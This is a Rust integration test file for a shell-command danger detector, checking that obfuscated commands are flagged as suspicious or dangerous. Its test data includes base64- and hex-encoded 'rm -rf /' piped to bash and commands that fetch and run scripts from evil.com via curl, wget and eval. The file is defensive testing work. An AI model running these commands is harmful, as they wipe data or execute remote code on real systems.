// Copyright 2025 Eric Jingryd (tidynest@proton.me)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use super::super::*;

// ========================================================================
// Integration Tests: Full Detection Pipeline
// ========================================================================

#[test]
fn test_detect_base64_encoded_command() {
    let detector = DangerDetector::new();

    // Real attack: base64-encoded "rm -rf /"
    let attack = "echo cm0gLXJmIC8= | base64 -d | bash";
    let assessment = detector.assess_command(attack);

    assert_eq!(
        assessment.danger_level,
        DangerLevel::Suspicious,
        "Base64 encoded command should be detected as Suspicious"
    );

    // Detection can happen via entropy analysis OR suspicious command detection (base64 tool)
    assert!(
        assessment.reason.contains("entropy")
            || assessment.reason.contains("base64")
            || assessment.reason.contains("malicious"),
        "Should mention encoding or malicious context: {}",
        assessment.reason
    );
}

#[test]
fn test_detect_hex_encoded_command() {
    let detector = DangerDetector::new();

    // Hex-encoded commands are also suspicious
    // Example: "726d202d7266202f" is "rm -rf /" in hex
    let command = "echo 726d202d7266202f | xxd -r -p | bash";
    let assessment = detector.assess_command(command);

    assert_eq!(
        assessment.danger_level,
        DangerLevel::Suspicious,
        "Hex encoded command should be detected as Suspicious"
    );

    // Detection can happen via entropy analysis OR suspicious command detection (xxd tool)
    assert!(
        assessment.reason.contains("entropy")
            || assessment.reason.contains("hex")
            || assessment.reason.contains("malicious"),
        "Should mention encoding or malicious context: {}",
        assessment.reason
    );
}

#[test]
fn test_real_world_attack_vectors() {
    let detector = DangerDetector::new();

    // Collection of real attack patterns seen in the wild
    // Note: These are detected via multiple mechanisms (suspicious commands, entropy, patterns)
    let attacks = vec![
        // Base64 encoded payload execution - detected via base64 tool or eval
        (
            "bash -c $(echo Y3VybCBldmlsLmNvbS9tYWx3YXJl | base64 -d)",
            "Base64 execution",
            DangerLevel::Suspicious,
        ),
        // Obfuscated wget - detected via base64 tool or eval
        (
            "eval $(echo d2dldCBldmlsLmNvbS9zaA== | base64 -d)",
            "Base64 obfuscated wget",
            DangerLevel::Suspicious,
        ),
        // Directly dangerous command
        (
            "curl https://evil.com/script.sh | sh",
            "RCE via pipe to shell",
            DangerLevel::Dangerous,
        ),
    ];

    for (attack, description, expected_min_level) in attacks {
        let assessment = detector.assess_command(attack);

        assert!(
            assessment.danger_level >= expected_min_level,
            "Attack '{}' should be detected as {:?} or higher, got {:?}: {}",
            description,
            expected_min_level,
            assessment.danger_level,
            attack
        );
    }
}
